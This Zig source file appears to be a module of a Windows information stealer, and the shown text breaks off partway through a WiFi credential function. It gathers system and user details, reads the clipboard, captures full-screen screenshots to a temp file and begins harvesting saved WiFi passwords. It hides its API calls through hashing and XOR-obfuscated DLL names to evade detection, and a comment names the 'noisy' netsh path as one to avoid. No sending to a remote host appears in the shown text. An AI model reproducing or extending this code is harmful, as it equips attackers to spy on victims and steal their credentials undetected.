const std = @import("std");
const coleta = @import("coleta.zig");
const furtivo = @import("furtivo.zig");
const obf = @import("obf.zig");
const winfs = @import("winfs.zig");
const ajuste = @import("ajuste.zig");

fn dynFn(comptime T: type, module: []const u8, comptime proc_hash: u32) ?T {
    const h = furtivo.getModuleHandle(module);
    if (h == 0) return null;
    const addr = obf.getProcAddressByHash(h, proc_hash) catch 0;
    if (addr == 0) return null;
    return @as(?T, @ptrFromInt(addr));
}

const SYSTEM_INFO = extern struct {
    wProcessorArchitecture: u16,
    wReserved: u16,
    dwPageSize: u32,
    lpMinimumApplicationAddress: ?*anyopaque,
    lpMaximumApplicationAddress: ?*anyopaque,
    dwActiveProcessorMask: usize,
    dwNumberOfProcessors: u32,
    dwProcessorType: u32,
    dwAllocationGranularity: u32,
    wProcessorLevel: u16,
    wProcessorRevision: u16,
};

const MEMORYSTATUSEX = extern struct {
    dwLength: u32,
    dwMemoryLoad: u32,
    ullTotalPhys: u64,
    ullAvailPhys: u64,
    ullTotalPageFile: u64,
    ullAvailPageFile: u64,
    ullTotalVirtual: u64,
    ullAvailVirtual: u64,
    ullAvailExtendedVirtual: u64,
};

const RTL_OSVERSIONINFOW = extern struct {
    dwOSVersionInfoSize: u32,
    dwMajorVersion: u32,
    dwMinorVersion: u32,
    dwBuildNumber: u32,
    dwPlatformId: u32,
    szCSDVersion: [128]u16,
};

const IP_ADDR_STRING = extern struct {
    Next: ?*IP_ADDR_STRING,
    IpAddress: [16]u8,
    IpMask: [16]u8,
    Context: u32,
};

const IP_ADAPTER_INFO = extern struct {
    Next: ?*IP_ADAPTER_INFO,
    ComboIndex: u32,
    AdapterName: [260]u8,
    Description: [132]u8,
    AddressLength: u32,
    Address: [8]u8,
    Index: u32,
    Type: u32,
    DhcpEnabled: u32,
    CurrentIpAddress: ?*IP_ADDR_STRING,
    IpAddressList: IP_ADDR_STRING,
    GatewayList: IP_ADDR_STRING,
    DhcpServer: IP_ADDR_STRING,
    HaveWins: u32,
    PrimaryWinsServer: IP_ADDR_STRING,
    SecondaryWinsServer: IP_ADDR_STRING,
    LeaseObtained: u32,
    LeaseExpires: u32,
};

/// Get local IPv4 address via GetAdaptersInfo (iphlpapi.dll).
/// Returns first non-loopback IPv4 address, or "127.0.0.1" on failure.
fn getLocalIp(allocator: std.mem.Allocator) []const u8 {
    const iphlpapi = furtivo.getModuleHandle(&comptime obf.xorStr("iphlpapi.dll"));
    if (iphlpapi == 0) return "127.0.0.1";

    const gai_addr = obf.getProcAddressByHash(iphlpapi, comptime obf.apiHash("GetAdaptersInfo")) catch 0;
    if (gai_addr == 0) return "127.0.0.1";

    const GetAdaptersInfoFn = *const fn (?*IP_ADAPTER_INFO, *u32) callconv(.winapi) u32;
    const GetAdaptersInfo = @as(GetAdaptersInfoFn, @ptrFromInt(gai_addr));

    // First call to get required size
    var size: u32 = 0;
    _ = GetAdaptersInfo(null, &size);
    if (size == 0) return "127.0.0.1";

    // Allocate buffer and call again
    const buf = allocator.alloc(u8, size) catch return "127.0.0.1";
    defer allocator.free(buf);

    const ret = GetAdaptersInfo(@ptrCast(@alignCast(buf.ptr)), &size);
    if (ret != 0) return "127.0.0.1";

    // Walk the linked list of adapters
    var adapter: ?*IP_ADAPTER_INFO = @ptrCast(@alignCast(buf.ptr));
    while (adapter != null) {
        const ad = adapter.?;
        // Walk the IP address list for this adapter
        var ip_entry: ?*IP_ADDR_STRING = &ad.IpAddressList;
        while (ip_entry != null) {
            const entry = ip_entry.?;
            // IpAddress is a null-terminated ASCII string in [16]u8
            const ip_str = std.mem.sliceTo(&entry.IpAddress, 0);
            // Skip "0.0.0.0" and loopback "127.x.x.x"
            if (ip_str.len > 0 and !(ip_str[0] == '0' and ip_str.len >= 7 and std.mem.eql(u8, ip_str[0..7], "0.0.0.0"))) {
                if (!(ip_str[0] == '1' and ip_str.len >= 4 and std.mem.eql(u8, ip_str[0..4], "127."))) {
                    return allocator.dupe(u8, ip_str) catch "127.0.0.1";
                }
            }
            ip_entry = entry.Next;
        }
        adapter = ad.Next;
    }

    return "127.0.0.1";
}

pub fn getSystemInfo(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const hostname = furtivo.getEnvVar(allocator, "COMPUTERNAME") catch "unknown";
    const username = furtivo.getEnvVar(allocator, "USERNAME") catch "unknown";

    // CPU cores
    var cpu_buf = std.ArrayListUnmanaged(u8){ .items = &.{}, .capacity = 0 };
    defer cpu_buf.deinit(allocator);
    const GetSystemInfoFn = *const fn (*anyopaque) callconv(.winapi) void;
    if (dynFn(GetSystemInfoFn, &comptime obf.xorStr("kernel32.dll"), comptime obf.apiHash("GetSystemInfo"))) |fn_ptr| {
        var si: SYSTEM_INFO = undefined;
        fn_ptr(&si);
        var buf: [32]u8 = undefined;
        const text = std.fmt.bufPrint(&buf, "{} cores", .{si.dwNumberOfProcessors}) catch "Unknown cores";
        cpu_buf.appendSlice(allocator, text) catch {};
    }
    if (cpu_buf.items.len == 0) cpu_buf.appendSlice(allocator, "Unknown") catch {};

    // RAM
    var ram_mb: u64 = 0;
    const GlobalMemoryStatusExFn = *const fn (*MEMORYSTATUSEX) callconv(.winapi) i32;
    if (dynFn(GlobalMemoryStatusExFn, &comptime obf.xorStr("kernel32.dll"), comptime obf.apiHash("GlobalMemoryStatusEx"))) |fn_ptr| {
        var ms: MEMORYSTATUSEX = .{
            .dwLength = @sizeOf(MEMORYSTATUSEX),
            .dwMemoryLoad = 0,
            .ullTotalPhys = 0,
            .ullAvailPhys = 0,
            .ullTotalPageFile = 0,
            .ullAvailPageFile = 0,
            .ullTotalVirtual = 0,
            .ullAvailVirtual = 0,
            .ullAvailExtendedVirtual = 0,
        };
        if (fn_ptr(&ms) != 0) {
            ram_mb = ms.ullTotalPhys / (1024 * 1024);
        }
    }

    // OS version
    var os_buf = std.ArrayListUnmanaged(u8){ .items = &.{}, .capacity = 0 };
    defer os_buf.deinit(allocator);
    const RtlGetVersionFn = *const fn (*RTL_OSVERSIONINFOW) callconv(.winapi) u32;
    if (dynFn(RtlGetVersionFn, &comptime obf.xorStr("ntdll.dll"), comptime obf.apiHash("RtlGetVersion"))) |fn_ptr| {
        var vi: RTL_OSVERSIONINFOW = .{
            .dwOSVersionInfoSize = @sizeOf(RTL_OSVERSIONINFOW),
            .dwMajorVersion = 0,
            .dwMinorVersion = 0,
            .dwBuildNumber = 0,
            .dwPlatformId = 0,
            .szCSDVersion = std.mem.zeroes([128]u16),
        };
        if (fn_ptr(&vi) == 0) {
            var buf: [64]u8 = undefined;
            const text = std.fmt.bufPrint(&buf, "Windows {}.{}.{}", .{ vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber }) catch "Windows";
            os_buf.appendSlice(allocator, text) catch {};
        }
    }
    if (os_buf.items.len == 0) os_buf.appendSlice(allocator, "Windows") catch {};

    // IP - local IP via GetAdaptersInfo (no external network call)
    var ip_buf = std.ArrayListUnmanaged(u8){ .items = &.{}, .capacity = 0 };
    defer ip_buf.deinit(allocator);
    const local_ip = getLocalIp(allocator);
    ip_buf.appendSlice(allocator, local_ip) catch {};
    if (ip_buf.items.len == 0) ip_buf.appendSlice(allocator, "127.0.0.1") catch {};

    col.sistema = .{
        .os = allocator.dupe(u8, os_buf.items) catch "Windows",
        .cpu = allocator.dupe(u8, cpu_buf.items) catch "Unknown",
        .ram_mb = ram_mb,
        .gpu = "Unknown GPU",
        .hostname = hostname,
        .username = username,
        .ip = allocator.dupe(u8, ip_buf.items) catch "127.0.0.1",
    };
}

pub fn getClipboard(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const OpenClipboardFn = *const fn (?*anyopaque) callconv(.winapi) i32;
    const CloseClipboardFn = *const fn () callconv(.winapi) i32;
    const GetClipboardDataFn = *const fn (u32) callconv(.winapi) ?*anyopaque;
    const GlobalLockFn = *const fn (*anyopaque) callconv(.winapi) ?*anyopaque;
    const GlobalUnlockFn = *const fn (*anyopaque) callconv(.winapi) i32;
    const GlobalSizeFn = *const fn (*anyopaque) callconv(.winapi) usize;

    const u32_mod = comptime obf.xorStr("user32.dll");
    const k32_mod = comptime obf.xorStr("kernel32.dll");

    const Open = dynFn(OpenClipboardFn, &u32_mod, comptime obf.apiHash("OpenClipboard")) orelse return;
    const Close = dynFn(CloseClipboardFn, &u32_mod, comptime obf.apiHash("CloseClipboard")) orelse return;
    const GetData = dynFn(GetClipboardDataFn, &u32_mod, comptime obf.apiHash("GetClipboardData")) orelse return;
    const Lock = dynFn(GlobalLockFn, &k32_mod, comptime obf.apiHash("GlobalLock")) orelse return;
    const Unlock = dynFn(GlobalUnlockFn, &k32_mod, comptime obf.apiHash("GlobalUnlock")) orelse return;
    const Size = dynFn(GlobalSizeFn, &k32_mod, comptime obf.apiHash("GlobalSize")) orelse return;

    if (Open(null) == 0) return;
    defer _ = Close();

    const CF_TEXT: u32 = 1;
    const handle = GetData(CF_TEXT) orelse return;
    const ptr = Lock(handle) orelse return;
    defer _ = Unlock(handle);

    const size = Size(handle);
    if (size == 0) return;

    const text = @as([*]const u8, @ptrCast(ptr))[0..size];
    var len: usize = 0;
    while (len < text.len and text[len] != 0) : (len += 1) {}

    col.clipboard = allocator.dupe(u8, text[0..len]) catch return;
}

const BITMAPINFOHEADER = extern struct {
    biSize: u32,
    biWidth: i32,
    biHeight: i32,
    biPlanes: u16,
    biBitCount: u16,
    biCompression: u32,
    biSizeImage: u32,
    biXPelsPerMeter: i32,
    biYPelsPerMeter: i32,
    biClrUsed: u32,
    biClrImportant: u32,
};

// GDI+ types
const GdiplusStartupInput = extern struct {
    GdiplusVersion: u32,
    DebugEventCallback: ?*anyopaque,
    SuppressBackgroundThread: i32,
    SuppressExternalCodecs: i32,
};

const EncoderParameter = extern struct {
    Guid: [4]u32, // CLSID as 4 u32s
    NumberOfValues: u32,
    Type: u32,
    Value: ?*anyopaque,
};

const EncoderParameters = extern struct {
    Count: u32,
    Parameter: [1]EncoderParameter,
};

// JPEG encoder CLSID: {557CF401-1A04-11D3-9A73-0000F81EF32E}
const jpeg_encoder_clsid = [4]u32{ 0x557CF401, 0x000011A3, 0x0000F81E, 0x00009A73 };

// Encoder Quality GUID: {1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}
const encoder_quality_guid = [4]u32{ 0x1D5BE4B5, 0x000045FA, 0x0000E7B5, 0x000052CD };

// Write raw BMP data to a file (helper)
fn writeRawFile(allocator: std.mem.Allocator, path: []const u8, data: []const u8) bool {
    const CreateFileWFn = *const fn ([*:0]const u16, u32, u32, ?*anyopaque, u32, u32, ?*anyopaque) callconv(.winapi) ?*anyopaque;
    const WriteFileFn = *const fn (?*anyopaque, [*]const u8, u32, *u32, ?*anyopaque) callconv(.winapi) i32;
    const CloseHandleFn = *const fn (?*anyopaque) callconv(.winapi) i32;

    const k32_mod = comptime obf.xorStr("kernel32.dll");
    const CreateFileW = dynFn(CreateFileWFn, &k32_mod, comptime obf.apiHash("CreateFileW")) orelse return false;
    const WriteFile_ = dynFn(WriteFileFn, &k32_mod, comptime obf.apiHash("WriteFile")) orelse return false;
    const CloseHandle = dynFn(CloseHandleFn, &k32_mod, comptime obf.apiHash("CloseHandle")) orelse return false;

    const GENERIC_WRITE: u32 = 0x40000000;
    const CREATE_ALWAYS: u32 = 2;
    const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;

    const path_w = std.unicode.utf8ToUtf16LeAllocZ(allocator, path) catch return false;
    defer allocator.free(path_w);

    const handle = CreateFileW(path_w, GENERIC_WRITE, 0, null, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, null);
    if (handle == @as(?*anyopaque, @ptrFromInt(std.math.maxInt(usize)))) return false;
    defer _ = CloseHandle(handle);

    var bytes_written: u32 = 0;
    var offset: usize = 0;
    while (offset < data.len) {
        const chunk_len: u32 = @intCast(@min(data.len - offset, @as(usize, 0x7FFFFFFF)));
        if (WriteFile_(handle, data.ptr + offset, chunk_len, &bytes_written, null) == 0) break;
        if (bytes_written == 0) break;
        offset += bytes_written;
    }
    return offset == data.len;
}

// Resolve a GDI+ function by obfuscated name via GetProcAddress.
fn resolveGdi(allocator: std.mem.Allocator, hMod: ?*anyopaque, comptime name: []const u8) ?*anyopaque {
    const GetProcAddressFn = *const fn (?*anyopaque, [*:0]const u8) callconv(.winapi) ?*anyopaque;
    const k32_mod = &comptime obf.xorStr("kernel32.dll");
    const GPA = dynFn(GetProcAddressFn, k32_mod, comptime obf.apiHash("GetProcAddress")) orelse return null;
    const name_obf = &comptime obf.xorStr(name);
    const name_dec = obf.dexor(allocator, name_obf) catch return null;
    defer allocator.free(name_dec);
    const name_z = allocator.dupeZ(u8, name_dec) catch return null;
    defer allocator.free(name_z);
    return GPA(hMod, name_z.ptr);
}

// Try to save BMP data as JPEG using GDI+ dynamic loading.
// Returns true on success (JPEG written to path), false on failure.
fn saveAsJpeg(allocator: std.mem.Allocator, bmp_data: []const u8, path: []const u8, quality: u32) bool {
    const LoadLibraryAFn = *const fn ([*:0]const u8) callconv(.winapi) ?*anyopaque;
    const FreeLibraryFn = *const fn (?*anyopaque) callconv(.winapi) i32;

    const k32_mod = &comptime obf.xorStr("kernel32.dll");
    const LoadLibraryA = dynFn(LoadLibraryAFn, k32_mod, comptime obf.apiHash("LoadLibraryA")) orelse return false;
    const FreeLibrary = dynFn(FreeLibraryFn, k32_mod, comptime obf.apiHash("FreeLibrary")) orelse return false;

    // Load gdiplus.dll
    const gdiplus_name = &comptime obf.xorStr("gdiplus.dll");
    const gdiplus_name_dec = obf.dexor(allocator, gdiplus_name) catch return false;
    defer allocator.free(gdiplus_name_dec);
    const gdiplus_name_z = allocator.dupeZ(u8, gdiplus_name_dec) catch return false;
    const hGdiplus = LoadLibraryA(gdiplus_name_z.ptr) orelse return false;
    defer _ = FreeLibrary(hGdiplus);

    // Resolve GDI+ function pointers
    const GdiplusStartupFn = *const fn (*usize, *const GdiplusStartupInput, ?*anyopaque) callconv(.winapi) u32;
    const GdiplusShutdownFn = *const fn (usize) callconv(.winapi) void;
    const GdipCreateBitmapFromScan0Fn = *const fn (i32, i32, i32, u32, ?*anyopaque, *?*anyopaque) callconv(.winapi) u32;
    const GdipSaveImageToFileFn = *const fn (?*anyopaque, [*:0]const u16, *const [4]u32, ?*const EncoderParameters) callconv(.winapi) u32;
    const GdipDisposeImageFn = *const fn (?*anyopaque) callconv(.winapi) u32;

    const GdiplusStartup = @as(?GdiplusStartupFn, @ptrCast(resolveGdi(allocator, hGdiplus, "GdiplusStartup") orelse return false)) orelse return false;
    const GdiplusShutdown = @as(?GdiplusShutdownFn, @ptrCast(resolveGdi(allocator, hGdiplus, "GdiplusShutdown") orelse return false)) orelse return false;
    const GdipCreateBitmapFromScan0 = @as(?GdipCreateBitmapFromScan0Fn, @ptrCast(resolveGdi(allocator, hGdiplus, "GdipCreateBitmapFromScan0") orelse return false)) orelse return false;
    const GdipSaveImageToFile = @as(?GdipSaveImageToFileFn, @ptrCast(resolveGdi(allocator, hGdiplus, "GdipSaveImageToFile") orelse return false)) orelse return false;
    const GdipDisposeImage = @as(?GdipDisposeImageFn, @ptrCast(resolveGdi(allocator, hGdiplus, "GdipDisposeImage") orelse return false)) orelse return false;

    // Startup GDI+
    var gdiplus_token: usize = 0;
    var startup_input: GdiplusStartupInput = .{
        .GdiplusVersion = 1,
        .DebugEventCallback = null,
        .SuppressBackgroundThread = 0,
        .SuppressExternalCodecs = 0,
    };
    if (GdiplusStartup(&gdiplus_token, &startup_input, null) != 0) return false;
    defer GdiplusShutdown(gdiplus_token);

    // Parse BMP header to extract width, height, and pixel data offset
    const bmp_info_ptr: *const BITMAPINFOHEADER = @ptrCast(@alignCast(bmp_data.ptr + 14));
    const img_width: i32 = bmp_info_ptr.biWidth;
    const img_height: i32 = if (bmp_info_ptr.biHeight < 0) -bmp_info_ptr.biHeight else bmp_info_ptr.biHeight;
    const is_bottom_up: bool = bmp_info_ptr.biHeight > 0;
    const pixel_data_offset: usize = 14 + @sizeOf(BITMAPINFOHEADER);

    // GDI+ PixelFormat32bppARGB = 0x0026200A
    const PixelFormat32bppARGB: u32 = 0x0026200A;
    // For bottom-up BMP data, use negative stride; for top-down, positive
    const stride: i32 = if (is_bottom_up) -(img_width * 4) else img_width * 4;

    var gp_bitmap: ?*anyopaque = null;
    const status = GdipCreateBitmapFromScan0(
        img_width,
        img_height,
        stride,
        PixelFormat32bppARGB,
        @ptrCast(@constCast(bmp_data.ptr + pixel_data_offset)),
        &gp_bitmap,
    );
    if (status != 0 or gp_bitmap == null) return false;
    defer _ = GdipDisposeImage(gp_bitmap);

    // Setup encoder parameters for JPEG quality
    var quality_value: u32 = quality;
    var enc_params: EncoderParameters = .{
        .Count = 1,
        .Parameter = .{.{
            .Guid = encoder_quality_guid,
            .NumberOfValues = 1,
            .Type = 4, // EncoderValueValueTypeLong = 4
            .Value = @ptrCast(&quality_value),
        }},
    };

    // Convert path to wide string for GdipSaveImageToFile
    const path_w = std.unicode.utf8ToUtf16LeAllocZ(allocator, path) catch return false;
    defer allocator.free(path_w);

    const save_status = GdipSaveImageToFile(gp_bitmap, path_w.ptr, &jpeg_encoder_clsid, &enc_params);
    return save_status == 0;
}

// Downscale pixel buffer using nearest-neighbor sampling.
// src is BGRA (32bpp), bottom-up. Returns new BGRA buffer (top-down for GDI+).
fn downscalePixels(allocator: std.mem.Allocator, src: []const u8, src_w: i32, src_h: i32, dst_w: i32, dst_h: i32) ![]u8 {
    const dst_size: usize = @as(usize, @intCast(dst_w)) * @as(usize, @intCast(dst_h)) * 4;
    const dst = try allocator.alloc(u8, dst_size);

    const sw: f64 = @floatFromInt(src_w);
    const sh: f64 = @floatFromInt(src_h);
    const dw: f64 = @floatFromInt(dst_w);
    const dh: f64 = @floatFromInt(dst_h);
    const x_ratio = sw / dw;
    const y_ratio = sh / dh;

    for (0..@intCast(dst_h)) |dy| {
        const sy_f: f64 = @as(f64, @floatFromInt(dy)) * y_ratio;
        const sy: usize = @intFromFloat(@floor(sy_f));
        const sy_clamped = @min(sy, @as(usize, @intCast(src_h - 1)));

        for (0..@intCast(dst_w)) |dx| {
            const sx_f: f64 = @as(f64, @floatFromInt(dx)) * x_ratio;
            const sx: usize = @intFromFloat(@floor(sx_f));
            const sx_clamped = @min(sx, @as(usize, @intCast(src_w - 1)));

            // Source is bottom-up: row sy from bottom
            const src_row = @as(usize, @intCast(src_h - 1)) - sy_clamped;
            const src_idx = (src_row * @as(usize, @intCast(src_w)) + sx_clamped) * 4;
            const dst_idx = (dy * @as(usize, @intCast(dst_w)) + dx) * 4;

            dst[dst_idx] = src[src_idx]; // B
            dst[dst_idx + 1] = src[src_idx + 1]; // G
            dst[dst_idx + 2] = src[src_idx + 2]; // R
            dst[dst_idx + 3] = src[src_idx + 3]; // A
        }
    }

    return dst;
}

pub fn takeScreenshot(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const GetDCFn = *const fn (?*anyopaque) callconv(.winapi) ?*anyopaque;
    const CreateCompatibleDCFn = *const fn (?*anyopaque) callconv(.winapi) ?*anyopaque;
    const CreateCompatibleBitmapFn = *const fn (?*anyopaque, i32, i32) callconv(.winapi) ?*anyopaque;
    const SelectObjectFn = *const fn (?*anyopaque, ?*anyopaque) callconv(.winapi) ?*anyopaque;
    const BitBltFn = *const fn (?*anyopaque, i32, i32, i32, i32, ?*anyopaque, i32, i32, u32) callconv(.winapi) i32;
    const GetDIBitsFn = *const fn (?*anyopaque, ?*anyopaque, u32, u32, ?*anyopaque, *anyopaque, u32) callconv(.winapi) i32;
    const DeleteObjectFn = *const fn (?*anyopaque) callconv(.winapi) i32;
    const DeleteDCFn = *const fn (?*anyopaque) callconv(.winapi) i32;
    const ReleaseDCFn = *const fn (?*anyopaque, ?*anyopaque) callconv(.winapi) i32;
    const GetSystemMetricsFn = *const fn (i32) callconv(.winapi) i32;

    const u32_mod = comptime obf.xorStr("user32.dll");
    const g32_mod = comptime obf.xorStr("gdi32.dll");

    const GetDC = dynFn(GetDCFn, &u32_mod, comptime obf.apiHash("GetDC")) orelse return;
    const ReleaseDC = dynFn(ReleaseDCFn, &u32_mod, comptime obf.apiHash("ReleaseDC")) orelse return;
    const GetSystemMetrics = dynFn(GetSystemMetricsFn, &u32_mod, comptime obf.apiHash("GetSystemMetrics")) orelse return;
    const CreateCompatibleDC = dynFn(CreateCompatibleDCFn, &g32_mod, comptime obf.apiHash("CreateCompatibleDC")) orelse return;
    const CreateCompatibleBitmap = dynFn(CreateCompatibleBitmapFn, &g32_mod, comptime obf.apiHash("CreateCompatibleBitmap")) orelse return;
    const SelectObject = dynFn(SelectObjectFn, &g32_mod, comptime obf.apiHash("SelectObject")) orelse return;
    const BitBlt = dynFn(BitBltFn, &g32_mod, comptime obf.apiHash("BitBlt")) orelse return;
    const GetDIBits = dynFn(GetDIBitsFn, &g32_mod, comptime obf.apiHash("GetDIBits")) orelse return;
    const DeleteObject = dynFn(DeleteObjectFn, &g32_mod, comptime obf.apiHash("DeleteObject")) orelse return;
    const DeleteDC = dynFn(DeleteDCFn, &g32_mod, comptime obf.apiHash("DeleteDC")) orelse return;

    const width = GetSystemMetrics(0);
    const height = GetSystemMetrics(1);
    if (width <= 0 or height <= 0) return;

    const hdcScreen = GetDC(null) orelse return;
    defer _ = ReleaseDC(null, hdcScreen);

    const hdcMem = CreateCompatibleDC(hdcScreen) orelse return;
    defer _ = DeleteDC(hdcMem);

    const hBitmap = CreateCompatibleBitmap(hdcScreen, width, height) orelse return;
    defer _ = DeleteObject(hBitmap);

    _ = SelectObject(hdcMem, hBitmap);
    if (BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, 0x00CC0020) == 0) return;

    const row_size = @as(u32, @intCast(width)) * 4;
    const img_size = row_size * @as(u32, @intCast(height));

    var bmi: BITMAPINFOHEADER = .{
        .biSize = @sizeOf(BITMAPINFOHEADER),
        .biWidth = width,
        .biHeight = height,
        .biPlanes = 1,
        .biBitCount = 32,
        .biCompression = 0,
        .biSizeImage = img_size,
        .biXPelsPerMeter = 0,
        .biYPelsPerMeter = 0,
        .biClrUsed = 0,
        .biClrImportant = 0,
    };

    const pixels = allocator.alloc(u8, img_size) catch return;
    defer allocator.free(pixels);

    if (GetDIBits(hdcMem, hBitmap, 0, @intCast(height), pixels.ptr, &bmi, 0) == 0) return;

    // Determine if we need to downscale
    var final_width: i32 = width;
    var final_height: i32 = height;
    var need_downscale = false;
    if (width > 1920 or height > 1080) {
        need_downscale = true;
        const ratio_w: f64 = 1920.0 / @as(f64, @floatFromInt(width));
        const ratio_h: f64 = 1080.0 / @as(f64, @floatFromInt(height));
        const ratio = @min(ratio_w, ratio_h);
        final_width = @intFromFloat(@floor(@as(f64, @floatFromInt(width)) * ratio));
        final_height = @intFromFloat(@floor(@as(f64, @floatFromInt(height)) * ratio));
        if (final_width < 1) final_width = 1;
        if (final_height < 1) final_height = 1;
    }

    // Build BMP data (either original or downscaled)
    var bmp_data: []u8 = undefined;
    var bmp_data_owned = false;

    if (need_downscale) {
        // Downscale using nearest-neighbor
        const scaled_pixels = downscalePixels(allocator, pixels, width, height, final_width, final_height) catch return;
        defer allocator.free(scaled_pixels);

        // Build BMP from scaled pixels (top-down, so biHeight is negative for top-down)
        const scaled_row_size = @as(u32, @intCast(final_width)) * 4;
        const scaled_img_size = scaled_row_size * @as(u32, @intCast(final_height));
        const hdr_size: usize = 14 + @sizeOf(BITMAPINFOHEADER);
        const total_size = hdr_size + scaled_img_size;

        bmp_data = allocator.alloc(u8, total_size) catch return;
        bmp_data_owned = true;

        var scaled_bmi: BITMAPINFOHEADER = .{
            .biSize = @sizeOf(BITMAPINFOHEADER),
            .biWidth = final_width,
            .biHeight = final_height, // positive = bottom-up, but our scaled data is top-down
            .biPlanes = 1,
            .biBitCount = 32,
            .biCompression = 0,
            .biSizeImage = scaled_img_size,
            .biXPelsPerMeter = 0,
            .biYPelsPerMeter = 0,
            .biClrUsed = 0,
            .biClrImportant = 0,
        };

        bmp_data[0] = 'B';
        bmp_data[1] = 'M';
        std.mem.writeInt(u32, bmp_data[2..6], @intCast(total_size), .little);
        std.mem.writeInt(u32, bmp_data[6..10], 0, .little);
        std.mem.writeInt(u32, bmp_data[10..14], @intCast(hdr_size), .little);
        @memcpy(bmp_data[14 .. 14 + @sizeOf(BITMAPINFOHEADER)], std.mem.asBytes(&scaled_bmi));
        @memcpy(bmp_data[hdr_size..], scaled_pixels);
    } else {
        // Use original BMP data
        const hdr_size: usize = 14 + @sizeOf(BITMAPINFOHEADER);
        const total_size = hdr_size + img_size;
        bmp_data = allocator.alloc(u8, total_size) catch return;
        bmp_data_owned = true;

        bmp_data[0] = 'B';
        bmp_data[1] = 'M';
        std.mem.writeInt(u32, bmp_data[2..6], @intCast(total_size), .little);
        std.mem.writeInt(u32, bmp_data[6..10], 0, .little);
        std.mem.writeInt(u32, bmp_data[10..14], @intCast(hdr_size), .little);
        @memcpy(bmp_data[14 .. 14 + @sizeOf(BITMAPINFOHEADER)], std.mem.asBytes(&bmi));
        @memcpy(bmp_data[hdr_size..], pixels);
    }
    defer if (bmp_data_owned) allocator.free(bmp_data);

    // Save to TEMP
    const temp = furtivo.getEnvVar(allocator, "TEMP") catch return;
    defer allocator.free(temp);

    // Try JPEG first via GDI+
    const jpeg_path = std.fmt.allocPrint(allocator, "{s}\\pipeta_screen.jpg", .{temp}) catch return;
    const jpeg_ok = saveAsJpeg(allocator, bmp_data, jpeg_path, 70);

    if (jpeg_ok) {
        col.screenshot = .{
            .path = jpeg_path,
            .width = final_width,
            .height = final_height,
        };
        return;
    }

    // GDI+ failed: fall back to raw BMP
    allocator.free(jpeg_path);
    const bmp_path = std.fmt.allocPrint(allocator, "{s}\\pipeta_screen.bmp", .{temp}) catch return;

    // Check size: skip if larger than the configured maximum
    const max_bmp: usize = ajuste.max_screenshot_size;
    if (bmp_data.len > max_bmp) {
        allocator.free(bmp_path);
        // Log size in screenshot info but don't save
        col.screenshot = .{
            .path = "",
            .width = final_width,
            .height = final_height,
        };
        return;
    }

    if (writeRawFile(allocator, bmp_path, bmp_data)) {
        col.screenshot = .{
            .path = bmp_path,
            .width = final_width,
            .height = final_height,
        };
    } else {
        allocator.free(bmp_path);
    }
}

// ========================================================
// WiFi credentials extraction
// ========================================================

pub fn getWifi(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    // Try wlanapi.dll API approach first (quiet)
    var wlan_mod = furtivo.getModuleHandle(&comptime obf.xorStr("wlanapi.dll"));

    if (wlan_mod == 0) {
        const k32 = furtivo.getModuleHandle(&comptime obf.xorStr("kernel32.dll"));
        if (k32 != 0) {
            const loadlib_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("LoadLibraryA")) catch 0;
            if (loadlib_addr != 0) {
                const LoadLibraryA = @as(*const fn ([*:0]const u8) callconv(.winapi) usize, @ptrFromInt(loadlib_addr));
                const wlan_name = obf.dexor(allocator, &comptime obf.xorStr("wlanapi.dll")) catch return;
                defer allocator.free(wlan_name);
                const wlan_name_z = allocator.dupeZ(u8, wlan_name) catch return;
                defer allocator.free(wlan_name_z);
                wlan_mod = LoadLibraryA(wlan_name_z.ptr);
            }
        }
    }

    // Only fall back to the noisy netsh path if the API is unavailable or
    // failed to read profiles that do exist.
    if (wlan_mod != 0 and getWifiViaApi(allocator, col, wlan_mod)) return;

    getWifiViaNetsh(allocator, col);
}

const GUID = extern struct {
    Data1: u32,
    Data2: u16,
    Data3: u16,
    Data4: [8]u8,
};

const WLAN_INTERFACE_INFO = extern struct {
    InterfaceGuid: GUID,
    strInterfaceDescription: [256]u16,
    isState: u32,
};

const WLAN_INTERFACE_INFO_LIST = extern struct {
    dwNumberOfItems: u32,
    dwIndex: u32,
    InterfaceInfo: [1]WLAN_INTERFACE_INFO,
};

const WLAN_PROFILE_INFO = extern struct {
    strProfileName: [256]u16,
    dwFlags: u32,
};

const WLAN_PROFILE_INFO_LIST = extern struct {
    dwNumberOfItems: u32,
    dwIndex: u32,
    ProfileInfo: [1]WLAN_PROFILE_INFO,
};

/// Returns true when the WLAN API could be used (including "no profiles
/// exist" — in that case there is nothing for netsh to find either).
fn getWifiViaApi(allocator: std.mem.Allocator, col: *coleta.Coleta, wlan_mod: usize) bool {
    const open_addr = obf.getProcAddressByHash(wlan_mod, comptime obf.apiHash("WlanOpenHandle")) catch 0;
    const close_addr = obf.getProcAddressByHash(wlan_mod, comptime obf.apiHash("WlanCloseHandle")) catch 0;
    const free_mem_addr = obf.getProcAddressByHash(wlan_mod, comptime obf.apiHash("WlanFreeMemory")) catch 0;
    const enum_if_addr = obf.getProcAddressByHash(wlan_mod, comptime obf.apiHash("WlanEnumInterfaces")) catch 0;
    const list_prof_addr = obf.getProcAddressByHash(wlan_mod, comptime obf.apiHash("WlanGetProfileList")) catch 0;
    const get_prof_addr = obf.getProcAddressByHash(wlan_mod, comptime obf.apiHash("WlanGetProfile")) catch 0;

    if (open_addr == 0 or close_addr == 0 or free_mem_addr == 0 or
        enum_if_addr == 0 or list_prof_addr == 0 or get_prof_addr == 0) return false;

    const WlanOpenHandle = @as(*const fn (u32, ?*anyopaque, *usize, *usize) callconv(.winapi) u32, @ptrFromInt(open_addr));
    const WlanCloseHandle = @as(*const fn (usize, ?*anyopaque) callconv(.winapi) u32, @ptrFromInt(close_addr));
    const WlanFreeMemory = @as(*const fn (?*anyopaque) callconv(.winapi) void, @ptrFromInt(free_mem_addr));
    const WlanEnumInterfaces = @as(*const fn (usize, ?*anyopaque, *?*WLAN_INTERFACE_INFO_LIST) callconv(.winapi) u32, @ptrFromInt(enum_if_addr));
